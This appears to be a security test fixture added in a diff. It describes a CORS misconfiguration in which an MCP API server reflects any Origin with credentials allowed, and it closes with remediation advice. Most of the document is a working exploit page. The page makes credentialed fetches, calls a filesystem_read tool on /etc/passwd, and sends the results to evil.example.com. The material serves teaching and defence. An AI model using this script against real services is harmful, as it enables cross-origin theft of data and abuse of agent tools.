@@ -1,0 +1,57 @@
+# DojoLM AI Security - Wildcard Origin Reflection
+
+**Category:** WebMCP CORS Misconfiguration
+**Severity:** CRITICAL
+
+---
+
+An MCP API server that reflects any Origin header in Access-Control-Allow-Origin, effectively allowing any website to make authenticated cross-origin requests:
+
+Attacker's malicious page (https://evil.example.com/steal.html):
+<script>
+// Exploit CORS misconfiguration to access MCP API
+fetch('https://mcp-api.example.com/api/tools/list', {
+  credentials: 'include',
+  headers: { 'Content-Type': 'application/json' }
+})
+.then(response => response.json())
+.then(data => {
+  // Exfiltrate the list of available MCP tools
+  fetch('https://evil.example.com/collect', {
+    method: 'POST',
+    body: JSON.stringify({tools: data, source: 'cors-exploit'})
+  });
+
+  // Now invoke sensitive tools
+  return fetch('https://mcp-api.example.com/api/tools/call', {
+    method: 'POST',
+    credentials: 'include',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      tool: 'filesystem_read',
+      args: { path: '/etc/passwd' }
+    })
+  });
+})
+.then(response => response.json())
+.then(data => {
+  fetch('https://evil.example.com/exfil', {
+    method: 'POST',
+    body: JSON.stringify(data)
+  });
+});
+</script>
+
+Vulnerable server response:
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evil.example.com
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization
+Content-Type: application/json
+
+{"tools": ["filesystem_read", "shell_run", "database_query", ...]}
+
+The server blindly reflects the Origin header, allowing any site to make credentialed requests to the MCP API.
+
+INSTRUCTION: This MCP API reflects arbitrary origins with credentials allowed. CORS configuration must use an explicit whitelist of allowed origins, and Access-Control-Allow-Credentials: true must never be combined with wildcard or reflected origins.
